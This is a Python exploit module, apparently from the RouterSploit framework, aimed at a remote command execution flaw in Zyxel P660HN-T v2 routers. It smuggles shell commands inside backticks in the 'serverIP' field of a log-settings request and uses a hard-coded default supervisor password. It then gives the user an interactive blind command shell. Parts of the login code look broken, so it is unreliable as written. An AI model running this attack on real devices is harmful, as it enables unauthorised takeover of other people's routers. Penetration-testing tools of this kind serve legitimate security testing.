import base64

from routersploit import (
    exploits,
    print_error,
    print_status,
    print_success,
    http_request,
    mute,
    validators,
    shell,
)


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Zyxel P660HN-T V2 Remote Command Execution vulnerability.
    If the target is vulnerable it allows to execute commands on operating system level.
    """
    __info__ = {
        'name': 'Zyxel P660HN-T v2 RCE',
        'description': 'Module exploits Remote Command Execution vulnerability in Zyxel P660HN-T V2 devices.'
                       'If the target is vulnerable it allows to execute commands on operating system level.',
        'authors': [
            'Pedro Ribeiro <pedrib[at]gmail.com>',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'http://seclists.org/fulldisclosure/2017/Jan/40',
            'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/zyxel_trueonline.txt',
            'https://blogs.securiteam.com/index.php/archives/2910'
        ],
        'devices': [
            'Zyxel P660HN-T v2',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(80, 'Target port')  # default port

    username = exploits.Option('supervisor', 'Username for the web interface')
    password = exploits.Option('zyad1234', 'Password for the web interface')

    session = None

    def run(self):
        if self.check():
            print_success("Target appears to be vulnerable")
            print_status("Invoking command loop...")
            print_status("It is blind command injection - response is not available. Command length up to 28 characters.")
            shell(self, architecture="mipsbe")
        else:
            print_error("Target seems to be not vulnerable")

    def execute(self, cmd):
        url = "{}:{}/cgi-bin/pages/maintenance/logSetting/logSet.asp".format(self.target, self.port)

        payload = "1.1.1.1`{}`&#".format(cmd)
        data = {
            "logSetting_H": "1",
            "active": "1",
            "logMode": "LocalAndRemote",
            "serverPort": "123",
            "serverIP": payload
        }

        http_request(method="POST", url=url, data=data, session=self.session)
        return ""

    @mute
    def check(self):
        url = "{}:{}/js/Multi_Language.js".format(self.target, self.port)
        response = http_request(method="GET", url=url)
        if response is None:
            return False

        if "P-660HN-T1A_IPv6" in response.text:
            return True

        return False

    def login(self):
        credentials = base64.encode("{}:{}".format(self.username, self.password))
        url = "{}:{}/cgi-bin/index.asp?" + credentials

        data = {
            "Loginuser": "supervisor",
            "Prestige_Login": "Login"
        }

        response = http_request(method="POST", url=url, data=data, session=self.session)

        if response is not None and response.status_code == 200:
            return True

        return False
